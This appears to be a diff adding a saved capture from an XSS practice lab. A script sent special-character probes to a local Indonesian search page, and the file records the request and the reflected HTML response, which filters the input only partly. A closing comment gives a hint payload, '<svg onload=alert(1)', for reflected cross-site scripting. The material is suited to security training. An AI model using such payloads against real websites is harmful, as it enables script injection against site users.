@@ -1,0 +1,24 @@
+<!-- generated_by: send_payloads.py -->
+<!-- generated_at: 2026-10-17T12:59:12.042293 -->
+<!-- input_sent: testing1'x"x>x<x/x\testing2 -->
+<!-- separator: x -->
+<!-- characters_names: single_quotexdouble_quotexgreater_thanxless_thanxslashxbackslash -->
+<!-- url: http://localhost/xss/xss5.php?q=testing1%27x%22x%3Ex%3Cx%2Fx%5Ctesting2 -->
+<!-- response_length: 450 -->
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Halaman Pencarian</title>
+</head>
+<body>
+	<form action="/xss/xss5.php" method="get">
+		<label>Pencarian:</label>
+		<input type="text" name="q" value="testing1&#039;x&quot;x&gt;x&lt;x/x\testing2" autocomplete="off">
+		<input type="submit" value="Search">
+	</form>
+	<br>
+	<h1>Hasil Pencarian: testing1'x"xx<x/x\testing2</h1>
+</body>
+</html>
+
+<!-- Petunjuk: http://localhost/xss/xss5.php?q=<svg onload=alert(1)+ -->
